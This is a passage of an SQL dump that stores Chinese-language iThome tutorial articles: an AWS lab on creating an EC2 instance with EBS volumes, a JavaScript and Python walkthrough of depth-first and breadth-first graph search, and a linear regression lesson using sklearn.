alt="https://ithelp.ithome.com.tw/upload/images/20211011/20141010AabfL1PKke.png"></p>\n<p>看到這個檔案代表專案建立成功啦！</p>\n<p>之後也可以跟著這些步驟繼續上傳新的版本～</p>\n</li>\n</ol>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'Modern Web',NULL,'2021-10-11 02:40:27');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10265858','Day 12 運算寶石：【Lab】EC2儲存資源 EBS Volume 建立與使用 (上)','無限手套 AWS 版：掌控一切的 5 + 1 雲端必學主題','12',replace('\n                        <div class="markdown__style">\n                                                            <p><img src="https://ithelp.ithome.com.tw/upload/images/20210914/20100951aqaopPkpM7.jpg" alt="https://ithelp.ithome.com.tw/upload/images/20210914/20100951aqaopPkpM7.jpg"></p>\n<p>今天我們要介紹 EC2 搭配 EBS 儲存資源的實際操作，那我們開始吧!</p>\n<h4>建立 VPC 環境</h4>\n<p>我們首先到 AWS Console 為 EC2 創造 VPC 環境，到 VPC 頁面之後按下 Launch VPC Wizard，進去之後能幫我們快速建立一個環境，選擇下圖紅圈框起的 VPC with a Single Public Subnet，我們要將 EC2 放在一個 Public Subnet 裡面。<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/201009515XqAtATqST.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/201009515XqAtATqST.png"></p>\n<p>進到下一個頁面，我們只需要給上 VPC Name 就好(我叫他 ec2-demo-vpc)，就可以按下 Create VPC 完成建立，看到 State 呈現 Available 就成功地建立起來了，如下圖:<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/201009516eI86VQYCe.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/201009516eI86VQYCe.png"></p>\n<h4>建立 EC2</h4>\n<p>接下來我們按下 Services，搜尋 EC2 進到 EC2 頁面，點擊 Instances，按下 Launch Instance 之後，我們將開始「 Launch Instance 的七步驟」。如下圖:<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951gdCnHrtlZ5.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951gdCnHrtlZ5.png"></p>\n<p><strong>Step1:</strong> Choose an Amazon Machine Image (AMI)。</p>\n<p>在這步驟，畫面左方列表有四種選項，包含 Quick Start，而 My AMIs 是專屬於你有的 AMI，AWS Marketplace 是商業公司所推出的 AMI 們，Community 則是社群版本的。我們在這邊會使用 Community (圖#1) 來創建一個 Demo，如下圖。<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951iMkeqZfu6r.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951iMkeqZfu6r.png"></p>\n<p>點開 Community AMIs 後，首先第一步會看到的畫面中左側列表 (下圖)，要決定作業系統，建議大家若沒有特別需求的話，Linux 就選擇 Amazon Linux，會跟整個雲端環境最相容，當然你也可以根據需求選擇其他種類。<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/201009514Ub2EUPMyJ.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/201009514Ub2EUPMyJ.png"></p>\n<p>Architecture 這邊我選擇 64-bit x86 的架構。</p>\n<p>Root Device Type 也就是我們的開機硬碟，我在 Demo 中使用 EBS 這個開機硬碟。<br>\n選擇完畢後，螢幕右方會出現 AMI 列表，任選一個就可以，如下圖。<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951kidLmzzC8S.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951kidLmzzC8S.png"></p>\n<p><strong>Step2:</strong> Choose an Instance Type</p>\n<p>接下來，我們要決定 Instance Type 的細部設定，在畫面中只要有綠底字寫 Free Tier 就代表是「免費方案」，如下圖，不過在這次 Demo 不會使用 Free Tier 的方案。<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951rRfhIwov9B.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951rRfhIwov9B.png"></p>\n<p>第二個我們要決定的關鍵點看到 Family，AWS 幫我們做了一個大的歸類，只要選擇上方下拉式選單的 All Instance Types 就可以看到多種分類。譬如說 Micro 是針對規模小的狀況，General 是一般狀況，Compute 則是特別專注於運算資源，FPGA 是在晶片產業會用到，GPU 專注於 GPU 類，Memory 專注於為記憶體效能，Storage 專注於儲存效能。而我們這次會使用「General Purpose」來建立 Demo。如下圖:<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951uQInkcqQwE.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951uQInkcqQwE.png"></p>\n<p>再來要決定 Storage，我在 AMI 時就已經決定開機硬碟要使用 EBS，在這部份我們要去決定，額外的硬體空間，是要去支援 EBS 而已 (EBS only)，還是說同時要去支持 Instance Store。而在這次示範 Demo 是要注重於示範 EBS，所以選擇了一個只能用 EBS 當作額外硬碟的設定。另外，無論是開機硬碟是 EBS，還是額外的硬碟是 EBS，我們都能決定EBS-Optimized Available，也就是決定是否要讓 EC2 Instance 與 EBS Volume 之間的網路是否用一個專屬網路，若這邊選擇 Yes，就代表可以發揮 EBS Volume 的最高效能。如下圖:<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951CXZicLto0m.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951CXZicLto0m.png"></p>\n<p>而 Type 中，有一個 t3a.nano，這是 AWS 幫助我們將所有數值統整後給他的一個名稱，一般我們是不會用到的。而其他數值選用自己想使用的就可以了，這樣我們就決定好 Instance Type 長什麼樣子。如下圖:<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951vdZkvAe3Td.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951vdZkvAe3Td.png"></p>\n<p><strong>Step3:</strong> Configure Instance Details</p>\n<p>接下來我們到Instance Details這一區，這區包含各種組合。首先看到Number of Instances，這邊起一個Instance就夠了。再來Network，要把他放進剛剛創建的VPC裡面(我的叫ec2-demo-vpc)，並把他放到Public Subnet。而Auto-assign Public IP如果按Enable，這樣在創建之後，AWS就會給一個Public IP，讓我能從本機連進去。其他選項都不用調整，這部分的選擇結果如下圖:<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951QEYPlleyd3.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951QEYPlleyd3.png"></p>\n<p><strong>Step4:</strong> Add Storage</p>\n<p>可以看到我們在 AMI 時就已經決定開機硬碟要是一個 EBS 的 Type，所以在 Volume Type 我們可以選擇要用 gp2 一般的預設，還是更高規格的io1，而 Magnetic 已經是舊版的類別，基本上不會特別使用到。如下圖:<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951io8swwDUTE.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951io8swwDUTE.png"></p>\n<p>Delete on Termination 指的是，當我們把整個 EC2 砍掉時，是否要保留這個 EBS Volume，如果打勾的話，就代表要讓他跟 EC2 一起消失。如下圖:<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/201009515wAgyc6iaz.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/201009515wAgyc6iaz.png"></p>\n<p>再來，試著加一個新的 Volume 看看，會看到現在的選擇只有 EBS，這是因為我們的 Instance Type 之前設定只允許額外的硬碟是屬於 EBS 這個類別。如下圖:<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951g2CaMd2fYc.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951g2CaMd2fYc.png"></p>\n<p>我們也可以在這個步驟看到 Size 跟 IOPS，目前 Size 是 8GB，IOPS 是 100，另外 3000 是 AWS 額外提供的 (指可以瞬間達到 3000，但真正長期的基準點還是 100)。<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951p2tOqXSv1L.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951p2tOqXSv1L.png"></p>\n<p>假設我們將 Size 從 8 提升到 80，就會看到 IOPS 也會跟著增長，也就是說 EBS 會隨著你的 Size 增加而增加，IOPS 能力也會跟著越高。最後我們的選擇如下圖，方便之後來深入做比較討論。<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/201009513uVKGbolGm.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/201009513uVKGbolGm.png"></p>\n<p><strong>Step5:</strong> Add Tags</p>\n<p>這部分保持預設，直接下一步即可。</p>\n<p><strong>Step6:</strong> Configure Security Group</p>\n<p>Security Group 按照預設即可，SSH 就夠用了。如下圖:<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951gk6dMH0LXP.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951gk6dMH0LXP.png"></p>\n<p><strong>Step7:</strong> Review Instance Launch</p>\n<p>這部分確定好之後就可按下 Launch，並選擇創建一個新的 Key Pair (我叫他my-ec2-keypair)後 Download Key Pair，設定好之後，就可以按下 Launch Instances，如下圖:<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/201009511eLN8OuA2Z.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/201009511eLN8OuA2Z.png"><br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951M0nIn0arkP.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951M0nIn0arkP.png"></p>\n<h4>確認結果</h4>\n<p>按下 View Instance 後，就看到 EC2 啟起來了，狀態為 running，可以幫他取名 (我叫他 ec2-ebs-demo )，等等就可以連進這台 EC2，如下圖:<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951lx2hNewZBk.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951lx2hNewZBk.png"></p>\n<p>在連進 EC2 之前，先看到左側列表 Elastic Block Store (EBS) 的 Volumes (下圖)。<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951XNrBj9cIZC.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951XNrBj9cIZC.png"></p>\n<p>這邊就可以確認一次起了兩個 EBS Volume，8GB 為開機硬碟，32GB 是後來加上的 (可參考 Step4 )，兩個都是 gp2。如下圖:<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951WPu50j9tbg.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951WPu50j9tbg.png"></p>\n<h4>小結</h4>\n<p>本單元，我們建立了擁有兩個 EBS Volume 的 EC2 Instance，但外接的 EBS Volume 還沒能被直接使用，我們還需要對此做檔案系統設定，由於 Lab 章節都相對篇幅多些，所以分成兩天來完成。</p>\n<h4>What''s Next?</h4>\n<p>明天我們將接著介紹「【Lab】EC2儲存資源 EBS Volume 建立與使用 (下)」。</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'IT管理',NULL,'2021-09-17 09:37:18');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10281404','【Day33】[演算法]-深度優先搜尋DFS與廣度優先搜尋BFS','資料結構與演算法，使用JavaScript與Python','33',replace('\n                        <div class="markdown__style">\n                                                            <p>深度優先搜尋(Depth-First Search,DFS)與廣度優先搜尋(Breadth-First Search, BFS)，是可以用來走訪或搜尋樹節點與圖頂點的演算法，先前介紹的二元樹走訪就是使用上述方法走訪各節點，這邊以圖結構來介紹。</p>\n<blockquote>\n<p>樹的走訪可以參考<a href="https://ithelp.ithome.com.tw/articles/10271647" target="_blank">此篇</a>。</p>\n</blockquote>\n<p>下面相鄰串列構成的圖來示範搜尋<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20211014/20121027Sag2cgA5z3.jpg" alt="https://ithelp.ithome.com.tw/upload/images/20211014/20121027Sag2cgA5z3.jpg"></p>\n<blockquote>\n<p>圖的介紹可以參考<a href="https://ithelp.ithome.com.tw/articles/10274995" target="_blank">此篇</a>。</p>\n</blockquote>\n<hr>\n<h3>深度優先搜尋DFS</h3>\n<p>先選定一個頂點開始走訪，接著從此頂點相鄰未被走過的頂點中，擇一走訪標示為記錄點，以此類推，不斷從新記錄點的相鄰未被走過頂點中尋找。<br>\n若新紀錄點的相鄰頂點都被走過，則退回前一個紀錄點，繼續從未被走過頂點中尋找。</p>\n<p>深度優先可以利用堆疊(Stack)的方式來處理。<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20211014/201210276jKV7VdkNs.jpg" alt="https://ithelp.ithome.com.tw/upload/images/20211014/201210276jKV7VdkNs.jpg"></p>\n<blockquote>\n<p>堆疊的介紹可以參考<a href="https://ithelp.ithome.com.tw/articles/10265265" target="_blank">此篇</a>。</p>\n</blockquote>\n<hr>\n<h3>廣度優先搜尋BFS</h3>\n<p>先選定一個頂點開始走訪，逐一走過此頂點相鄰未被走過的頂點，若相鄰頂點都被走過，再從走訪過的頂點中擇一為新記錄點，逐一走過新記錄點相鄰未被走過的頂點，以此類推。</p>\n<p>廣度優先可以利用佇列(Queue)的方式來處理。<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20211014/20121027TnPd6lTzWS.jpg" alt="https://ithelp.ithome.com.tw/upload/images/20211014/20121027TnPd6lTzWS.jpg"></p>\n<blockquote>\n<p>佇列的介紹可以參考<a href="https://ithelp.ithome.com.tw/articles/10266980" target="_blank">此篇</a>。</p>\n</blockquote>\n<hr>\n<h3>JavaScript</h3>\n<pre><code class="language-javascript">class Graph {\n  constructor() {\n    this.adjacencyList = {}\n  }\n\n	//新增頂點\n  addVertex(vertex) {\n    if (!this.adjacencyList[vertex]) {\n     	this.adjacencyList[vertex] = []\n    } else {\n      return ''頂點已存在'';\n    }\n  }\n  \n  //新增邊\n  addEdge(vertex1, vertex2) {\n    if (this.adjacencyList[vertex1]) {\n      if (this.adjacencyList[vertex2]){\n        this.adjacencyList[vertex1].push(vertex2)\n        this.adjacencyList[vertex2].push(vertex1)\n      }else {\n        return ''第二項頂點不存在'';\n      }\n    } else {\n      return ''第一項頂點不存在'';\n    }\n  }\n  \n  //刪除頂點\n  removeVertex(vertex) {\n    if (this.adjacencyList[vertex]) {\n     	this.adjacencyList[vertex].forEach(function(item) {\n        this.removeEdge(vertex, item)\n        delete this.adjacencyList[vertex]\n      });\n    } else {\n      return ''此頂點已不存在'';\n    }\n  }\n  \n  //刪除邊\n  removeEdge(vertex1, vertex2) {\n    if (this.adjacencyList[vertex1]) {\n      if (this.adjacencyList[vertex2]){\n        this.adjacencyList[vertex1] = this.adjacencyList[vertex1].filter(\n        	(vertex) =&gt; vertex !== vertex2\n        )\n        this.adjacencyList[vertex2] = this.adjacencyList[vertex2].filter(\n        	(vertex) =&gt; vertex !== vertex1\n        )\n      }else {\n        return ''第二項頂點已不存在'';\n      }\n    } else {\n      return ''第一項頂點已不存在'';\n    }\n  }\n\n	printGraph(){\n  	console.log(this.adjacencyList)\n  }\n  \n  //廣度優先\n	bfs(start) {\n      const queue = [start];\n      const result = [];\n      const visited = {};\n      visited[start] = true;\n      let currentVertex;\n      while (queue.length) {\n        currentVertex = queue.shift();\n        result.push(currentVertex);\n        this.adjacencyList[currentVertex].forEach(neighbor =&gt; {\n          if (!visited[neighbor]) {\n            visited[neighbor] = true;\n            queue.push(neighbor);\n          }\n        });\n      }\n      return result;\n  }\n  \n  //深度優先\n  dfs(start) {\n      const result = [];\n      const stack = [start];\n      const visited = {};\n      visited[start] = true;\n      let currentVertex;\n      while (stack.length) {\n        currentVertex = stack.pop();\n        result.push(currentVertex);\n        this.adjacencyList[currentVertex].forEach(neighbor =&gt; {\n          if (!visited[neighbor]) {\n            visited[neighbor] = true;\n            stack.push(neighbor);\n          }\n        });\n      }\n      return result;\n  }  \n\n}\n\nlet graph = new Graph();\n\ngraph.addVertex(''A'');\ngraph.addVertex(''B'');\ngraph.addVertex(''C'');\ngraph.addVertex(''D'');\ngraph.addVertex(''E'');\ngraph.addVertex(''F'');\n\ngraph.addEdge(''A'', ''B'');\ngraph.addEdge(''A'', ''D'');\ngraph.addEdge(''A'', ''E'');\ngraph.addEdge(''B'', ''C'');\ngraph.addEdge(''D'', ''E'');\ngraph.addEdge(''E'', ''F'');\ngraph.addEdge(''E'', ''C'');\ngraph.printGraph();\n//{\n//  A: ["B", "D", "E"],\n//  B: ["A", "C"],\n//  C: ["B", "E"],\n//  D: ["A", "E"],\n//  E: ["A", "D", "F", "C"],\n//  F: ["E"]\n//}\n\nconsole.log(graph.bfs(''A''))\n//["A", "B", "D", "E", "C", "F"]\nconsole.log(graph.dfs(''A''))\n//["A", "E", "C", "F", "D", "B"]\nconsole.log(graph.dfs(''B''))\n//["B", "C", "E", "F", "D", "A"]\nconsole.log(graph.dfs(''C''))\n//["C", "E", "F", "D", "A", "B"]\nconsole.log(graph.dfs(''D''))\n//["D", "E", "C", "B", "F", "A"]\nconsole.log(graph.dfs(''E''))\n//["E", "C", "B", "F", "D", "A"]\nconsole.log(graph.dfs(''F''))\n//["F", "E", "C", "B", "D", "A"]\n</code></pre>\n<hr>\n<h3>Python</h3>\n<pre><code class="language-python">#Graph\ngraph = {\n    ''A'': ["B", "D", "E"],\n    ''B'': ["A", "C"],\n    ''C'': ["B", "E"],\n    ''D'': ["A", "E"],\n    ''E'': ["A", "D", "F", "C"],\n    ''F'': ["E"]     \n}\ndef bfs(graph,start):\n    queue = []\n    queue.append(start)\n    result = []\n    visited = set()\n    visited.add(start)\n    while(len(queue)&gt;0):\n        currentVertex = queue.pop(0)\n        result.append(currentVertex)\n        for neighbor in graph[currentVertex]:\n            if neighbor not in visited:\n                queue.append(neighbor)\n                visited.add(neighbor)\n    return result\ndef dfs(graph,start):\n    stack = []\n    result = []\n    stack.append(start)\n    visited = set()\n    visited.add(start)\n    while(len(stack)&gt;0):\n        currentVertex = stack.pop()\n        result.append(currentVertex)\n        for neighbor in graph[currentVertex]:\n            if neighbor not in visited:\n                stack.append(neighbor)\n                visited.add(neighbor)\n    return result\n\n\nprint(bfs(graph,''A''))\n#[''A'', ''B'', ''D'', ''E'', ''C'', ''F'']\n\nprint(dfs(graph,''A''))\n#[''A'', ''E'', ''C'', ''F'', ''D'', ''B'']\n</code></pre>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'Software Development',NULL,'2021-10-14 01:21:15');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10268453','[Day 8] 線性迴歸 (Linear Regression)','全民瘋AI系列2.0','8',replace('\n                        <div class="markdown__style">\n                                                            <h1>線性迴歸(Linear Regression)</h1>\n<h2>今日學習目標</h2>\n<ul>\n<li>認識線性迴歸\n<ul>\n<li>透過機器學習來找出一條函式，來最佳化模型</li>\n<li>兩種求解方法</li>\n</ul>\n</li>\n<li>線性迴歸程式手把手\n<ul>\n<li>簡單線性迴歸、多元迴歸、非線性迴歸</li>\n</ul>\n</li>\n</ul>\n<h2>認識線性迴歸</h2>\n<p>線性迴歸是統計上在找多個自變數和依變數之間的關係所建出來的模型。只有一個自變數(x)和一個依變數(y)的情形稱為簡單線性迴歸大於一個自變數(x1,x2,...)的情形稱為多元迴歸。</p>\n<p>一個簡單線性回歸: y=ax+b，其中 b：截距(Intercept)，a：斜率(Slope) 為 x 變動一個單位 y 變動的量，如下圖:</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210920/20107247PXqySvXAyd.png" alt="https://ithelp.ithome.com.tw/upload/images/20210920/20107247PXqySvXAyd.png"></p>\n<p>回歸分析的目標函數或稱損失函數(loss function)就是希望找到的模型最終的殘差越小越好，來找參數 a 和 b。</p>\n<h2>兩種求解方法</h2>\n<p>線性模型最常見的解法有兩種，分別為 Closed-form (閉式解) 與梯度下降 (Gradient descent)。當特徵少時使用 Closed-form 較為適合，使用下面公式來求出 θ 值。我們又可以說線性模型的最小平方法的解即為 Closed-form。若當是複雜的問題時 Gradient descen 較能解決，其原因是大部分的問題其實是沒有公式解的。我們只能求出一個函數 f(x) 使其誤差最小越好。</p>\n<ul>\n<li>\n<p>Closed-form<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210920/20107247qW1aRNIU04.png" alt="https://ithelp.ithome.com.tw/upload/images/20210920/20107247qW1aRNIU04.png"></p>\n</li>\n<li>\n<p>Gradient descent<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210920/20107247ZDjdHBgCkM.png" alt="https://ithelp.ithome.com.tw/upload/images/20210920/20107247ZDjdHBgCkM.png"></p>\n</li>\n</ul>\n<h2>Least Square Method (最小平方法)</h2>\n<p>假設一個地區的房價與坪數是呈線性關係，並以下圖中的三個點表示。如果我們想透過房子的坪數來預測房價，那麼我們的目標就是找到一條直線，並與座標平面上這三個點的差距越小越好。那這條直線該怎麼找呢？首先我們隨機找一條直線，並計算這三點的 loss。損失函數可以自己定義，假設我們使用 MSE 均方誤差來計算。透過一系列計算我們得到一個 loss 即為 MSE 值。接著我們將這個直線稍稍的轉一個角度後又可以計算一個新的 MSE，此刻我們可以發現 MSE 值又比剛剛更小了。也就是說這一條新的直線能夠更法應出訓練集中 A、B、C 的數據點所反映的房屋坪數與房價之間的線性關係。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210920/2010724748iVUFwtOY.png" alt="https://ithelp.ithome.com.tw/upload/images/20210920/2010724748iVUFwtOY.png"></p>\n<p>簡單來說我們在一個二維空間中，我們可以找到無數條直線。現在我們能做的事情就是從這無數條直線中選出一條最佳的當作我們的預測模型，同時它面對這三點的誤差是要最小的。因此我們的目標就是要最小化 MSE 也就是所謂的損失函數 (loss function)。所以整個線性回歸的目標就是最小化我們的損失函數，其中一個解法就是最小平方法。因為 MSE 等於 1/n 倍的残差平方和 (RSS)，其中分母 n 為常數，不影響極小化故拿掉。因此最終的求解是滿足最小化平方和，使其最小化。經過數學推導後，簡化的公式如下：</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210920/20107247qW1aRNIU04.png" alt="https://ithelp.ithome.com.tw/upload/images/20210920/20107247qW1aRNIU04.png"></p>\n<h3>小試身手</h3>\n<p>基於上面的公式我們想找出一組參數權重 θ。也就是下圖問題中的 a (θ0)、b (θ1) 兩參數，使得平面上這三點平方和有極小值。這個函式對 θ0, θ1 偏做微分設他們為0，接著我們對方程式求解。 此函式只有極小值，因此我們得到的 θ0, θ1 最小極值的解。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210920/20107247DMKEp9wHPX.png" alt="https://ithelp.ithome.com.tw/upload/images/20210920/20107247DMKEp9wHPX.png"></p>\n<h2>範例程式 (房價預測)</h2>\n<h3>手刻線性回歸</h3>\n<p>我們透過 Sklearn 所提供的房價預測資料集進行線性回歸模型建模，並採用最小平法。首先為了要驗證我們上面的公式，因此我們先利用 Numpy 套件自己手刻做一系列的矩陣運算求出每一項的係數與截距。</p>\n<pre><code class="language-py">import numpy as np\nimport pandas as pd\nfrom sklearn.metrics import mean_squared_error\nfrom sklearn.datasets import load_boston\n\n# 載入 Sklearn 房價預測資料集 13個輸入特徵 1個輸出特徵\nboston_dataset = load_boston()\n# 輸入特徵共13個\nX = boston_dataset.data\n# 設定截距項 b 權重值為 1 \nb=np.ones((X.shape[0], 1))\n# 添加常數項特徵，最終有 13+1 個輸入特徵\nX=np.hstack((X, b))\n# 輸出(房價)\ny = boston_dataset.target\n\n# 計算 Beta (@ 為 numpy 中 2-D arrays 的矩陣乘法)\nBeta = np.linalg.inv(X.T @ X) @ X.T @ y\ny_pred = X @ Beta\n\n# MSE: 21.8948311817292\nprint(''MSE:'', mean_squared_error(y_pred, y))\n</code></pre>\n<p>計算出來 Beta 後我們再把所有的 X 帶入並做計算，算出來的結果 MSE 為 21.89。最後我們可以試著把 Beta 變數列印出來。總共會有 14 個參數，由 13 個輸入特徵係數與最後一項截距所組成的。</p>\n<p>輸出結果：</p>\n<pre><code>array([-1.08011358e-01,  4.64204584e-02,  2.05586264e-02,  2.68673382e+00,\n       -1.77666112e+01,  3.80986521e+00,  6.92224640e-04, -1.47556685e+00,\n        3.06049479e-01, -1.23345939e-02, -9.52747232e-01,  9.31168327e-03,\n       -5.24758378e-01,  3.64594884e+01])\n</code></pre>\n<h2>使用 Sklearn LinearRegression</h2>\n<p>線性回歸簡單來說，就是將複雜的資料數據，擬和至一條直線上，就能方便預測未來的資料。接下來我們一樣使用房價預測資料集，並使用 Sklearn 提供的 LinearRegression 來求解。</p>\n<p>Parameters:</p>\n<ul>\n<li>fit_intercept: 是否有截距，如果沒有則直線過原點。</li>\n</ul>\n<p>Attributes:</p>\n<ul>\n<li>coef_: 取得係數。</li>\n<li>intercept_: 取得截距。</li>\n</ul>\n<p>Methods:</p>\n<ul>\n<li>fit: 放入X、y進行模型擬合。</li>\n<li>predict: 預測並回傳預測類別。</li>\n<li>score: R2 score 模型評估。</li>\n</ul>\n<pre><code class="language-py">import numpy as np\nimport pandas as pd\nfrom sklearn.linear_model import LinearRegression\nfrom sklearn.metrics import mean_squared_error\nfrom sklearn.datasets import load_boston\n\n# 載入 Sklearn 房價預測資料集 13個輸入特徵 1個輸出特徵\nboston_dataset = load_boston()\n# 輸入特徵共13個\nX = boston_dataset.data\n# 輸出(房價)\ny = boston_dataset.target\n\n# 訓練模型\nlinearModel = LinearRegression()\nlinearModel.fit(X, y)\n\ny_pred = linearModel.predict(X)\n# 21.894831181729202\nprint(''MSE:'', mean_squared_error(y_pred, y))\n</code></pre>\n<p>Sklearn 的 LinearRegression 模型也是採用小平方法求解。我們可以發現其 MSE 與稍早手刻的方法相當很接近。另外 Sklearn 模型同時也提供了 <code>coef_</code> 和 <code>intercept_</code> 兩個屬性可以取得模型的特徵係數與截距。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210920/20107247dvjJ7X84SE.png" alt="https://ithelp.ithome.com.tw/upload/images/20210920/20107247dvjJ7X84SE.png"></p>\n<h2>多項式的回歸模型</h2>\n<p>對於線性回歸來說，資料都是很均勻地分布在一條直線上，但現實的資料往往是非線性的分佈。如果我們一樣使用上述方法取得線性模型，在實際場域上預測效果可能並不大。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210920/20107247SDzjMHfk1k.png" alt="https://ithelp.ithome.com.tw/upload/images/20210920/20107247SDzjMHfk1k.png"></p>\n<p>多項式回歸中，數據不太具有線性關係，因此應尋找一些非線性曲線去擬合。對於以上的數據，原本是只有一個 x 特徵，但是我們可以建構許多新的特徵。如下圖，用一條三次曲線去擬合數據效果更好。我們將三次函數看成 ax3+bx2+cx+d。這樣就又變成解多元，其我們就是要找出 a、b、c、d 使其損失函數最小。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210920/20107247gMw42e2mvs.png" alt="https://ithelp.ithome.com.tw/upload/images/20210920/20107247gMw42e2mvs.png"></p>\n<h3>線性模型的擴展</h3>\n<p>從上述問題中我們可以發現線性回歸在實務上所面臨的問題。首先我們來回顧一下稍早所提到的線性方程式，這組線性方程式說明了每個特徵 x 一次方與目標值是有一個線性的關係。</p>\n<p>y = β0 + β1x1 + β2x2 + ... + βnxn</p>\n<p>接著我們再來看一下另一個例子，比如說特徵 x1 與目標值存在著以下的關係。我們發現這組方程式已經不是一個線性關係了，因為他有了 x1 的二次方。</p>\n<p>y = β0 + β1x1 + β2x12</p>\n<p>那麼該怎麼做我們才能又把它轉換成線性關係呢？這時候我們就可以用一個新的特徵 x2。我們讓 x2 等於 x1 的平方，這樣我們再把 x2 帶回原方程式中。此時這兩個特徵 x1 與 x2 與目標值又回到了線性關係。</p>\n<p>Let x2 = x12</p>\n<p>=&gt; y = β0 + β1x1 + β2x2</p>\n<p>同樣的我們再來看另一個例子。我們如果引入了 x1 的三次方的話，他的方程式如下：</p>\n<p>y = β0 + β1x1 + β2x12 + β3x13</p>\n<p>同理我們這時一樣可以引入新的特徵 x2 等於 x1 的二次方，以及 x3 等於 x1 的三次方。這樣經過一個轉換以後我們的 y 值與所有的特徵間依然存在著線性關係。</p>\n<p>Let x2 = x12 and x3 = x13</p>\n<p>=&gt; y = β0 + β1x1 + β2x2 + β3x3</p>\n<p>這裡做一個小結。我們可以透過引入轉變過後的 x 作為一個新的特徵來滿足線性假設。此時的回歸方程式就是一個多項式回歸(polynomial regression)。</p>\n<h2>Sklearn 實作多項式回歸</h2>\n<p>由於 Sklearn 沒有封裝好的多項式回歸模型可以直接呼叫。不過我們可以透過 <code>make_pipeline</code> 將 <code>PolynomialFeatures</code> 與 <code>LinearRegression</code> 封裝成一個多項式回歸模型，並且使用者可以隨意設定 degree(次方)值。</p>\n<p>我們可以對原本的特徵進行 PolynomialFeatures 構造新樣本特徵採。並將轉換後的特徵送到線性回歸模型進行擬合。因此我們可以自定義一個 <code>PolynomialRegression()</code> 的函式，使用者可以輸入 degree 大小控制模型的強度。在這個函式中我們使用 Sklearn 的 pipeline 方法將 <code>PolynomialFeatures</code> 特徵轉換與 <code>LinearRegression</code> 線性回歸模型封裝起來。另外以下範例是透過自訂義的 <code>make_data()</code> 函式產生一組隨機的 x 和 y。該函式中可以設定隨機資料的比數，下面程式中我們先隨機建立 100 筆數據。</p>\n<pre><code class="language-py">from sklearn.linear_model import LinearRegression\nfrom sklearn.preprocessing import PolynomialFeatures\nfrom sklearn.pipeline import make_pipeline\nplt.style.use(''seaborn'')\n\n# make_pipeline是指可以將多個Sklearn的function一起執行\ndef PolynomialRegression(degree=2, **kwargs):\n    return make_pipeline(PolynomialFeatures(degree),\n                         LinearRegression(**kwargs))\n\n# 隨機定義新的x,y值\ndef make_data(N,err=1,rseed=42):\n    rng=np.random.RandomState(rseed)\n    x = rng.rand(N,1)**2\n    y = 10-1/(x.ravel()+0.1)\n    if err&gt;0:\n        y+=err*rng.randn(N)\n    return x,y\n\nX, y = make_data(100)\n</code></pre>\n<p>訓練資料與測試資料都建立完成後。我們就可以將訓練資料丟入建立好的 <code>PolynomialRegression()</code> 並進行數據擬合。下面範例程式中我們演示 degree 等於 